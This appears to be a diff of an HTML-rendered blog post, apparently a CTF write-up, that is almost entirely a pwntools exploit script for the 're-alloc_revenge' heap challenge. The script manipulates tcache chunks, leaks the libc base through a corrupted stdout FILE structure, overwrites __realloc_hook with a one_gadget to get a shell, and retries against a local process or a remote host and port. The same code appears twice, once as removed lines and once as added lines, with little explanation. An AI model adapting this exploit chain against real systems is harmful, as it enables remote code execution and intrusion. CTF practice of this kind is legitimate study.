-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad1800</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=sa>b</span><span class=s2>&#34;leak:&#34;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-
-    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;leak:&#34;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
-        <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;failed&#34;</span><span class=p>)</span>
-        <span class=k>return</span>
-    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x1E5700</span>
-    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc_base&#34;</span><span class=p>,</span> <span class=n>libc_base</span><span class=p>)</span>
-
-    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;F&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__realloc_hook&#34;</span><span class=p>]))</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;G&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;G&#34;</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=c1># gdb.attach(io, &#34;b realloc&#34;)</span>
-    <span class=c1># allocate(1, 0x58, p64(libc_base+libc.sym[&#34;malloc&#34;])+p64(libc_base+one_gadget))</span>
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>))</span>
-
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x58</span><span class=p>))</span>
-    
-    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-
-<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
-<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
-
-<span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
-<span class=c1># if True:</span>
-    <span class=k>try</span><span class=p>:</span>
-        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;----------------------------------------------------------&#34;</span><span class=p>)</span>
-        <span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
-        <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
-            <span class=c1># io = process(localfile, aslr=False)</span>
-            <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
-        <span class=k>else</span><span class=p>:</span>
-            <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
-                <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
-            <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
-                <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
-                <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
-            <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
-
-        <span class=n>exp</span><span class=p>()</span>
-    <span class=k>except</span><span class=p>:</span>
-        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=ref>ref</h2>
-<ol>
-<li>
-<p><a href=https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0>https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0</a></p>
-</li>
-<li>
-<p><a href=http://blog.eonew.cn/archives/1190>http://blog.eonew.cn/archives/1190</a></p>
-</li>
-</ol>
-</div>
-<div class=post-copyright>
-<p class=copyright-item>
-<span class=item-title>文章作者</span>
-<span class=item-content>hhdx</span>
-</p>
-<p class=copyright-item>
-<span class=item-title>上次更新</span>
-<span class=item-content>
-2020-09-07
-</span>
-</p>
-</div>
-<footer class=post-footer>
-<div class=post-tags>
-<a href=/tags/ctf/>CTF</a>
-</div>
-<nav class=post-nav>
-<a class=prev href=/post/arm-pwn/>
-<i class="iconfont icon-left"></i>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./re-alloc_revenge&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>allocate</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Data:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>realloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>size</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Data:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x106ef8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># 0x60 count++</span>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xa7</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;&#34;&#34;b menu</span>
+</span></span><span class=line><span class=cl>    <span class=c1># b read_input</span>
+</span></span><span class=line><span class=cl>    <span class=c1># &#34;&#34;&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad1800</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=sa>b</span><span class=s2>&#34;leak:&#34;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;leak:&#34;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;failed&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x1E5700</span>
+</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc_base&#34;</span><span class=p>,</span> <span class=n>libc_base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;F&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__realloc_hook&#34;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;G&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;G&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b realloc&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># allocate(1, 0x58, p64(libc_base+libc.sym[&#34;malloc&#34;])+p64(libc_base+one_gadget))</span>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x58</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=c1># if True:</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;----------------------------------------------------------&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># io = process(localfile, aslr=False)</span>
+</span></span><span class=line><span class=cl>            <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>exp</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
